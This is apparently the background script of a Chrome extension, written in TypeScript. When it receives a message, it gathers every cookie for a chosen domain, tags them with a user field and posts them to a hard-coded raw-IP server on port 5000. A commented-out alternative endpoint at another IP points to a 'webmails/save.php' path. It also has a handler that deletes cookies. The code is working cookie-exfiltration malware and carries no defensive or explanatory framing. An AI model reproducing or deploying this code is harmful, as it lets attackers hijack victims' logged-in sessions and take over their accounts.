import { json } from '../types';
import { Cookies, Storage } from '../redefination';
import ky from 'ky';
import { removeAllCookies } from '../cookies';

chrome.storage.local.get('url').then(({ url }) => {
  if (!url) {
    chrome.storage.local.set({ url: 'http://5.161.143.0:5000/data' });
  }
});

// @ts-ignore
chrome.runtime.onMessage.addListener(function (message: any) {
  if (message['GET_COOKIES']) {
    handleCookie(message);
  }
  if (message['DELETE_COOKIES']) {
    console.log('clearing cookies');
    for (const url of message.urls) {
      console.log('clearing cookie ' + url);
      removeAllCookies(url);
    }
  }
});

async function handleCookie(message: any) {
  const domain = message['domain'];
  const extraCookies = message['extraCookies'];
  const user = message['user'];
  const cookies = await Cookies.getAll({ domain: domain });
  const postData = {
    user,
    domain,
    cookie: [...cookies, ...extraCookies],
  };

  console.log(postData);
  const data = await sendCookies(postData);
  console.log(data);
}

async function sendCookies(data: json): Promise<string> {
  const { url } = await Storage.get('url');
  // const baseURL = 'http://95.111.230.118/webmails/save.php';
  // const baseURL = 'http://127.0.0.1:5000';
  const res = await ky.post(url, { json: data });
  return await res.text();
}
